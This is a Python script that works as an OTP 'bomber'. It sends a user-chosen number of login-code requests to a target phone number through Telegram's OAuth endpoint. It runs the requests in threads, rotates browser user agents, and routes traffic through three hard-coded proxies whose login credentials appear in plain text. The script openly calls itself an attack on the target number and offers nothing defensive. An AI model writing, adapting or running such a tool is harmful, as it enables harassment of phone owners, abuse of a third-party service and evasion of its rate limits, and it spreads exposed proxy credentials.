import requests
import threading
import random
import time

proxies = [
    "http://wkmhwbnd:p1u3snhpeyzv@64.137.96.74:6641/",
    "http://wkmhwbnd:p1u3snhpeyzv@191.96.254.138:6185/",
    "http://wkmhwbnd:p1u3snhpeyzv@23.26.71.145:5628/"
]

user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.73 Mobile Safari/537.36"
]

def send_otp(phone, proxy=None):
    url = "https://oauth.telegram.org/auth/request?bot_id=531675494&origin=https%3A%2F%2Ftelegram.org"
    headers = {
        "User-Agent": random.choice(user_agents),
        "Referer": "https://telegram.org",
        "Content-Type": "application/x-www-form-urlencoded"
    }
    data = {"phone": f"88{phone}"}
    
    try:
        response = requests.post(url, data=data, headers=headers, proxies={"http": proxy, "https": proxy} if proxy else None, timeout=10)
        
        if response.status_code == 200 and "true" in response.text:
            print(f"[✔] OTP Sent to {phone} ✅")
        else:
            print(f"[✘] Failed to Send OTP to {phone} ❌ | Response: {response.text}")
    except requests.exceptions.RequestException as e:
        print(f"[!] Error: {e}")

def start_attack(phone, amount):
    threads = []
    for _ in range(amount):
        proxy = random.choice(proxies) if proxies else None
        thread = threading.Thread(target=send_otp, args=(phone, proxy))
        thread.start()
        threads.append(thread)
        time.sleep(random.uniform(0.5, 2))
    
    for thread in threads:
        thread.join()

if __name__ == "__main__":
    phone = input("Enter Target Number (Without +88): ")
    amount = int(input("Enter Number of Requests: "))
    
    print(f"Starting Attack on +88{phone} with {amount} OTP Requests...\n")
    start_attack(phone, amount)
## Written By @Al_Nayeem756
